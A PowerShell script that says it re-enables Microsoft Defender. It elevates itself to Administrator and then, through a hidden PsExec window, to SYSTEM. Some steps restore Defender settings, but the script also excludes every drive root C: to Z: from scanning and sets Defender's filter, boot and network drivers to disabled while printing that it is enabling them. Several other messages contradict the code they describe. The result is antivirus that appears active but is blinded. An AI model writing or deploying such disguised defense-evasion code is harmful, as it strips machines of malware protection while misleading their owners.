# Write-Host cmdlet is used to write the customized output to a host. 
Write-Host "Running Powershell as `"$(whoami)`"."  -BackgroundColor White -ForegroundColor Black

#STEP 0 : elevate if needed
if(-Not $($(whoami) -eq "nt authority\system")) {  #checking if user is system or not?
    $IsSystem = $false

    # Elevate to admin (needed when called after reboot)
    if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
        Write-Host "    [i] Elevate to Administrator"
        $CommandLine = "-ExecutionPolicy Bypass `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments
        Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
        Exit
    }

    # Elevate to SYSTEM if psexec is available
    $psexec_path = $(Get-Command PsExec -ErrorAction 'ignore').Source 
    if($psexec_path) {
        Write-Host "    [i] Elevate to SYSTEM"   -BackgroundColor White -ForegroundColor Black

        $CommandLine = " -i -s powershell.exe -ExecutionPolicy Bypass `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments 
        Start-Process -WindowStyle Hidden -FilePath $psexec_path -ArgumentList $CommandLine
        exit
    } else {
        Write-Host "    [i] PsExec not found, will continue as Administrator"   -BackgroundColor Red -ForegroundColor Black

    }

} else {
    $IsSystem = $true
}

Write-Host " Adding the All available Drives for exclusions"   -BackgroundColor White -ForegroundColor Black

#iterating from all posible ascii code for drive path and adding to the ecluding path. 
67..90|foreach-object{    
    $drive = [char]$_
    Add-MpPreference -ExclusionPath "$($drive):\" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "$($drive):\*" -ErrorAction SilentlyContinue
}

Write-Host "    [+] All Drive Root Directory been added as eclusions."

Write-Host "Press any key to continue the process..."   -BackgroundColor White -ForegroundColor Black

[void][System.Console]::ReadKey($true)

Write-Host "    [+] Enabling scanning engines (Set-MpPreference)"   -BackgroundColor White -ForegroundColor Black


Set-MpPreference -DisableArchiveScanning 0 -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring 0 -ErrorAction SilentlyContinue
Set-MpPreference -DisableIntrusionPreventionSystem 0 -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection 0 -ErrorAction SilentlyContinue
Set-MpPreference -DisableRemovableDriveScanning 0 -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen 0 -ErrorAction SilentlyContinue
Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan 0 -ErrorAction SilentlyContinue
Set-MpPreference -DisableScanningNetworkFiles 0 -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning 0 -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring 0 -ErrorAction SilentlyContinue

Write-Host "    [+] Set default actions to Allow (Set-MpPreference)" -BackgroundColor White -ForegroundColor Black

Set-MpPreference -LowThreatDefaultAction Quarantine -ErrorAction SilentlyContinue
Set-MpPreference -ModerateThreatDefaultAction Quarantine -ErrorAction SilentlyContinue
Set-MpPreference -HighThreatDefaultAction Quarantine -ErrorAction SilentlyContinue


#Enabling Services
Write-Host "    [+] Trying to Enable Services."   -BackgroundColor White -ForegroundColor Black
# WdNisSvc Network Inspection Service 
# WinDefend Antivirus Service
# Sense : Advanced Protection Service
#Meaning of Integers : 3 is Manual, 2 is Automatic service startup & 4 is Disable.
$need_reboot = $false
$svc_list = @("WdNisSvc", "WinDefend", "Sense")
foreach($svc in $svc_list)
{
    if($(Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc")) 
    {
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc" -Name Start -Value 2
    Write-Host " Services Set to Automatic startup."  -BackgroundColor Red -ForegroundColor White

    $need_reboot = $true
    }
    else
    {
        Write-Host ("    [i] Service Not available")  -BackgroundColor Red -ForegroundColor White
    }
        
}


#Enabling Drivers
Write-Host "    [+] Trying to Enable Drivers."   -BackgroundColor White -ForegroundColor Black
# WdnisDrv : Network Inspection System Driver
# wdfilter : Mini-Filter Driver
# wdboot : Boot Driver

$drv_list = @("WdnisDrv", "wdfilter", "wdboot")
foreach($drv in $drv_list) {
    if($(Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv")) 
    {
        Write-Host "        [i] Enabling Drivers $drv (next reboot)" -BackgroundColor White -ForegroundColor Black
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv" -Name Start -Value 4
        $need_reboot = $true
    } 
    else 
    {
        Write-Host "  [i] Driver $drv already deleted" -BackgroundColor White -ForegroundColor Black
    }
}

# Check if service running or not
if($(GET-Service -Name WinDefend).Status -eq "Running") {   
    Write-Host "    [+] WinDefend Service is Running"
} else {
    Write-Host "    [+] WinDefend Service not running"
    $need_reboot = $true

}

if($IsSystem) {

        # Configure the Defender registry to disable it (and the TamperProtection)
        # editing HKLM:\SOFTWARE\Microsoft\Windows Defender\ requires to be SYSTEM

        Write-Host "    [+] Enable all functionnalities with registry keys (SYSTEM privilege)"  -BackgroundColor White -ForegroundColor Black

        # Cloud-delivered protection:
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name SpyNetReporting -Value 1
        # Automatic Sample submission
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name SubmitSamplesConsent -Value 1
        # Tamper protection
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name TamperProtection -Value 2
        
        # Enable in registry
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 0
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 0

    } else {
        Write-Host "    [W] (Optional) Cannot configure registry (not SYSTEM)" -BackgroundColor White -ForegroundColor Black
    }

    
Write-Host ""
Read-Host -Prompt "Press any key to continue"